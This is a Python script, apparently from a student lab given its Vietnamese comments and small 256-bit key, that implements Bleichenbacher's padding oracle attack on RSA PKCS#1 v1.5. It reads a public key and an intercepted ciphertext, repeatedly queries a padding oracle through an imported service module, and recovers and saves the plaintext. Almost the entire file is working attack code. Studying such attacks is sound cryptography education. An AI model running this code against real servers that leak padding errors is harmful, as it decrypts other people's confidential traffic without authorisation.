import sys
import os
import random
import time
from collections import namedtuple

import time
import threading

import rsa
import utils
import sendingService

Interval = namedtuple("Interval", ["lower_bound", "upper_bound"])

if len(sys.argv) != 3:
    print("Usage: python3 attack.py <publickey_file> <paddingtext_file>")
    sys.exit(1)

publickey_file = sys.argv[1]
paddingtext_file = sys.argv[2]
print(publickey_file)
print(paddingtext_file)


modulus_size = 256

with open(publickey_file, "r") as pub_file:
    n, e = map(int, pub_file.read().splitlines())
pk = (n, e)
print(pk)


# modulus size in bytes
k = modulus_size // 8

# global start timer
t_start = time.perf_counter()

# keep track of the oracle calls
global queries
queries = 0


# thực hiện phép chia lấy phần nguyên
def floor(a, b):
    return a // b

# thực hiện phép chia lấy phần nguyên nhưng tăng thêm 1 nếu có dư
def ceil(a, b):
    return a // b + (a % b > 0)

# Mã hóa một thông điệp theo chuẩn PKCS1 v1.5
def PKCS1_encode(message, total_bytes):
    """
    Encodes the given message using PKCS1 v1.5 scheme:
    PKCS1(M) = 0x00 | 0x02 | [non-zero padding bytes] | 0x00 | [M]
    length(PKCS1(M)) = total_bytes
    """

    # 11 = 3 constant bytes and at aleast 8 bytes for padding
    if len(message) > total_bytes - 11:
        raise Exception("Message to big for encoding scheme!")

    pad_len = total_bytes - 3 - len(message)

    # non-zero padding bytes
    padding = bytes(random.choices(range(1, 256), k = pad_len))

    encoded = b"\x00\x02" + padding + b"\x00" + message

    return encoded

# Giải mã một chuỗi được mã hóa theo PKCS1 v1.5
def PKCS1_decode(encoded):
    """
    Decodes a PKCS1 v1.5 string.
    Remove constant bytes and random pad until arriving at "\x00".
    The rest is the message.
    """

    encoded = encoded[2:]
    idx = encoded.index(b"\x00")

    message = encoded[idx + 1 :]

    return message


def prepare(message):
    """
    Suppose we intercept a padded ciphertext.
    Our goal is to completely decrypt it, just by using the oracle.
    """
    message_encoded = PKCS1_encode(message, k)
    ciphertext = rsa.encrypt_string(pk, message_encoded)
    return ciphertext


# Step 2.A.
def find_smallest_s(lower_bound, c):
    """
    Find the smallest s >= lower_bound,
    such that (c * s^e) (mod n) decrypts to a PKCS conforming string
    """
    s = lower_bound

    while True:
        attempt = (c * pow(s, e, n)) % n
        attempt = utils.integer_to_bytes(attempt)

        if sendingService.oracle(attempt):
            return s

        s += 1


# Step 2.C.
def find_s_in_range(a, b, prev_s, B, c):
    """
    Given the interval [a, b], reduce the search
    only to relevant regions (determined by r)
    and stop when an s value that gives
    a PKCS1 conforming string is found.
    """
    ri = ceil(2 * (b * prev_s - 2 * B), n)

    while True:
        si_lower = ceil(2 * B + ri * n, b)
        si_upper = ceil(3 * B + ri * n, a)

        for si in range(si_lower, si_upper):
            attempt = (c * pow(si, e, n)) % n
            attempt = utils.integer_to_bytes(attempt)

            if sendingService.oracle(attempt):
                return si

        ri += 1


def safe_interval_insert(M_new, interval):
    """
    Deal with interval overlaps when adding a new one to the list
    """

    for i, (a, b) in enumerate(M_new):

        # overlap found, construct the larger interval
        if (b >= interval.lower_bound) and (a <= interval.upper_bound):
            lb = min(a, interval.lower_bound)
            ub = max(b, interval.upper_bound)

            M_new[i] = Interval(lb, ub)
            return M_new

    # no overlaps found, just insert the new interval
    M_new.append(interval)

    return M_new


# Step 3.
def update_intervals(M, s, B):
    """
    After found the s value, compute the new list of intervals
    """

    M_new = []

    for a, b in M:
        r_lower = ceil(a * s - 3 * B + 1, n)
        r_upper = ceil(b * s - 2 * B, n)

        for r in range(r_lower, r_upper):
            lower_bound = max(a, ceil(2 * B + r * n, s))
            upper_bound = min(b, floor(3 * B - 1 + r * n, s))

            interval = Interval(lower_bound, upper_bound)

            M_new = safe_interval_insert(M_new, interval)

    M.clear()

    return M_new


def bleichenbacher(ciphertext):
    """
    Perform Bleichenbacher attack as described in his paper.
    """

    # Step 1. is only needed when the ciphertext is
    # not PKCS1 conforming

    # integer value of ciphertext
    c = utils.bytes_to_integer(ciphertext)

    B = 2 ** (8 * (k - 2))

    M = [Interval(2 * B, 3 * B - 1)]

    # Step 2.A.
    s = find_smallest_s(ceil(n, 3 * B), c)

    M = update_intervals(M, s, B)

    # print("lmao")
    # start = time.time()
    while True:
        # Step 2.B.
        if len(M) >= 2:
            s = find_smallest_s(s + 1, c)

        # Step 2.C.
        elif len(M) == 1:
            a, b = M[0]

            # Step 4.
            if a == b:
                return utils.integer_to_bytes(a % n)

            s = find_s_in_range(a, b, s, B, c)
        

        M = update_intervals(M, s, B)
        end = time.time()
        # if end - start == 20:
        #     return False

def run_with_timeout(func, args=(), timeout=20):
    """Chạy một hàm với giới hạn thời gian (timeout)."""
    result = [None]  # Lưu kết quả hàm
    event = threading.Event()

    def wrapper():
        result[0] = func(*args)
        event.set()  # Đánh dấu đã hoàn thành

    thread = threading.Thread(target=wrapper)
    thread.start()
    thread.join(timeout)  # Chờ tối đa `timeout` giây

    if thread.is_alive():
        print("---------")
        print("Timeout! The attack was failed!")
        return None  # Trả về None nếu quá thời gian

    return result[0]


def main():
    global queries

    simulations = False

    if simulations:
        total = []

        for i in range(100):
            message = bytes(os.urandom(11))
            ciphertext = prepare(message)
            decrypted = bleichenbacher(ciphertext)
            decrypted = sendingService.PKCS1_decode(decrypted)

            assert decrypted == message

            total.append(queries)
            print(i)

            queries = 0

        print(total)
    else:
        # message = b"This is a sample."
        # print(message)
        # ciphertext = prepare(message)
        # with open("paddingtext.txt", "wb") as f:
            # f.write(ciphertext)
        with open(paddingtext_file, "rb") as f:
            ciphertext = f.read()

         # 1. Gọi hàm với timeout 20 giây
            decrypted = run_with_timeout(bleichenbacher, args=(ciphertext,), timeout=20)

            if decrypted is None:
                return 0
        # decrypted = bleichenbacher(ciphertext)

        # if decrypted == False:
        #     print("Không được rồi em ơi!")
        #     return 0

        decrypted = sendingService.PKCS1_decode(decrypted)
        print("----------")
        print("queries:\t{}".format(sendingService.get_queries()))
        print("decrypt:\t{}".format(decrypted))
        print("The results have been saved in the file result.txt")
        with open("result.txt", "w", encoding="utf-8") as result_file:
            result_file.write(decrypted.decode("utf-8", errors="ignore"))

if __name__ == "__main__":
    main()

